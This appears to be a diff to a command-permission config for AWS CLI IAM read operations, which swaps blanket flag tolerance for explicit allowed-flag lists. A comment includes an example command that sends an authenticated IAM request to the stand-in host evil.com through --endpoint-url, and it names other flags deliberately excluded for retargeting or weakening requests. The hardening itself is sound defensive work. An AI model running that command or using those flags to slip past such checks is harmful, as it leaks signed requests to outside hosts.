@@ -139,8 +139,26 @@ source = "https://docs.aws.amazon.com/cli/latest/reference/ec2/describe-instance
 [[command.sub]]
 name = "iam"
 first_arg = ["get-*", "list-*"]
-tolerate_unknown_short = true
-tolerate_unknown_long = true
+# The verb glob stays — IAM's `get-`/`list-` operations return principals, policies and posture
+# metadata, and the ones that return credential material are carved out as explicit sub-subs below.
+# What the glob lacked was a flag list: it admitted on the verb alone and never examined the rest of
+# the line, so `aws iam list-users --endpoint-url http://evil.com` sent an authenticated IAM request
+# to an arbitrary host and classified as an ordinary read.
+#
+# Researched for IAM read operations: response shaping (`--query`, `--output`, `--filter`), paging
+# (`--max-items`, `--page-size`, `--starting-token`, `--marker`, `--max-length`), transport timeouts,
+# and the resource-naming parameters the read verbs take. DELIBERATELY ABSENT: `--endpoint-url`
+# (retargets the authenticated request), `--profile` (reads as a different identity), `--ca-bundle`
+# (substitutes the trust anchor), `--no-verify-ssl`, `--no-sign-request`.
+first_arg_standalone = ["--debug", "--help", "--no-cli-pager", "--no-paginate", "--only-attached"]
+first_arg_valued = [
+  "--cli-binary-format", "--cli-connect-timeout", "--cli-read-timeout", "--color",
+  "--group-name", "--instance-profile-name", "--marker", "--max-items", "--max-length",
+  "--open-id-connect-provider-arn", "--output", "--page-size", "--path-prefix", "--policy-arn",
+  "--policy-name",
+  "--query", "--region", "--role-name", "--saml-provider-arn", "--scope", "--server-certificate-name",
+  "--serial-number", "--starting-token", "--user-name", "--version-id",
+]
 
 [[command.sub.sub]]
 name = "get-credential-report"
